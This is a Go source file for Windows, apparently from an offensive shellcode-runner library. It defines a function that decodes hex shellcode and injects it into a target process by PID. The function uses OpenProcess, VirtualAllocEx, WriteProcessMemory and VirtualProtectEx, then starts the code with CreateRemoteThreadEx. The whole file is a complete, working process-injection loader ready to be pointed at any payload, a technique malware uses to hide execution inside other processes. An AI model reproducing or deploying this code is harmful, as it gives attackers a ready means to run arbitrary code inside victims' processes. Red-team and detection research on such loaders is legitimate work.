// +build windows

/*
This program executes shellcode in a remote process using the following steps
	1. Get a handle to the target process
	1. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write
	2. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process
	3. Change the memory page permissions to Execute/Read with VirtualProtectEx
	4. Execute the entrypoint of the shellcode in the remote process with CreateRemoteThread
	5. Close the handle to the remote process

This program leverages the functions from golang.org/x/sys/windows WHERE POSSIBLE to call Windows procedures instead of manually loading them
*/

package go_shellcode

import (
	"encoding/hex"
	"errors"
	"fmt"
	"unsafe"

	// Sub Repositories
	"golang.org/x/sys/windows"
)

func RunSCcreateRemoteThread(sc string, printLevel, pid int) error {
	var verbose, debug bool
	if printLevel > 0 {
		verbose = true
	}
	if printLevel > 1 {
		debug = true
	}
	// verbose := flag.Bool("verbose", false, "Enable verbose output")
	// debug := flag.Bool("debug", false, "Enable debug output")
	// // To hardcode the Process Identifier (PID), change 0 to the PID of the target process
	// pid := flag.Int("pid", 0, "Process ID to inject shellcode into")
	// flag.Parse()

	// Pop Calc Shellcode
	shellcode, errShellcode := hex.DecodeString(sc)
	if errShellcode != nil {
		return errors.New(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")

	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")

	if debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Getting a handle to Process ID (PID) %d...", pid))
	}
	pHandle, errOpenProcess := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(pid))

	if errOpenProcess != nil {
		return errors.New(fmt.Sprintf("[!]Error calling OpenProcess:\r\n%s", errOpenProcess.Error()))
	}
	if verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully got a handle to process %d", pid))
	}

	if debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualAllocEx on PID %d...", pid))
	}
	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		return errors.New(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		return errors.New("[!]VirtualAllocEx failed and returned 0")
	}
	if verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully allocated memory in PID %d", pid))
	}

	if debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling WriteProcessMemory on PID %d...", pid))
	}
	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		return errors.New(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}
	if verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully wrote shellcode to PID %d", pid))
	}

	if debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualProtectEx on PID %d...", pid))
	}
	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		return errors.New(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
	}
	if verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully change memory permissions to PAGE_EXECUTE_READ in PID %d", pid))
	}

	if debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Call CreateRemoteThreadEx on PID %d...", pid))
	}
	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
		return errors.New(fmt.Sprintf("[!]Error calling CreateRemoteThreadEx:\r\n%s", errCreateRemoteThreadEx.Error()))
	}
	if verbose {
		fmt.Println(fmt.Sprintf("[+]Successfully create a remote thread in PID %d", pid))
	}

	if debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling CloseHandle on PID %d...", pid))
	}
	errCloseHandle := windows.CloseHandle(pHandle)
	if errCloseHandle != nil {
		return errors.New(fmt.Sprintf("[!]Error calling CloseHandle:\r\n%s", errCloseHandle.Error()))
	}
	if verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully closed the handle to PID %d", pid))
	}
	return nil
}

// export GOOS=windows GOARCH=amd64;go build -o goCreateRemoteThread.exe cmd/CreateRemoteThread/main.go
